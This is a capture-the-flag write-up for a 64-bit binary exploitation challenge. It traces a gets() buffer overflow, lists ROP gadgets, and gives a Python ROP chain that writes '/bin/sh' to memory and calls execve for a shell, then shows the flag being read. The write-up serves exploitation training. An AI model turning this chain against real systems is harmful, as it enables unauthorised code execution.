# Admin - 64bit pwn
we are given a staticly linked 64bit executable with NX enabled but no PIE or stack canary.   
```console
root@kali:~/CTF/jctf/admin# ./admin 
Username: 
admin
Welcome admin
```
we immediately see a buffer overflow.     
```console
root@kali:~/CTF/jctf/admin# python -c "print 'A'*500"| ./admin 
Username: 
Bye AAAAAAAAAAAA...
Segmentation fault
```
after analysing the code we can see why that is.
(the function names don't appear because of the static linking but it's easy to guess their names).                

```asm
lea     rax, [rbp+input]
mov     rdi, rax
mov     eax, 0
call    gets ; a call to gets = BOF
lea     rax, [rbp+input]
lea     rsi, aAdmin     
mov     rdi, rax
call    strcmp
test    eax, eax
jnz     short loc_400B97
```
ok. a rop chain is needed to gain code execution.         
using ROPgadget we can find a syscall gadget.        
```
0x000000000040123c : syscall
```
but no "/bin/sh" in the binary.            
this requires some write gadget.                  
this is the one I chose.         
```
0x000000000048d102 : mov dword ptr [rax], edx ; ret
```
we pick somewhere in a rw section to place our string and craft a rop chain using some more gadgets:           
```
0x000000000044bce9 : pop rdx ; pop rsi ; ret
0x0000000000415544 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
```
(full code is in exploit.py)
```python
str_dest=0x006b6208  # someplace in a rw section

exploit=b'A'*72 # padding
exploit+=p64(SET_RDX_RSI)
exploit+=b'/bin\x00\x00\x00\x00' # set rdx to start of string
exploit+=p64(0x41414141)
exploit+=p64(SET_RAX)
exploit+=p64(str_dest) # rax to set addr
exploit+=p64(WRITE_EDX_RAX) # write mem
exploit+=p64(SET_RDX_RSI)
exploit+=b'/sh\x00\x00\x00\x00\x00' # last part of string...
exploit+=p64(0x41414141)
exploit+=p64(SET_RAX)
exploit+=p64(str_dest+4)
exploit+=p64(WRITE_EDX_RAX) # full string written


exploit+=p64(SET_RDX_RSI) # set up params...
exploit+=p64(0x0)
exploit+=p64(0x0)
exploit+=p64(SET_RDI)
exploit+=p64(str_dest)
exploit+=p64(SET_RAX)
exploit+=chr(0x3b)+"\x00"*7 # rax=0x3b
exploit+=p64(SYSCALL) # make the syscall

r.sendline(exploit)
r.interactive()
```
and...             
nice.
```console
root@kali:~/CTF/jctf/admin# python exploit.py 
[+] Opening connection to 35.186.153.116 on port 7002: Done
[*] Switching to interactive mode
$ ls
admin
bin
dev
flag.txt
lib
lib32
lib64
$ cat flag.txt
IJCTF{W3lc0m3_4g4in_d34r_AADMMIINN!!!}
$  
```
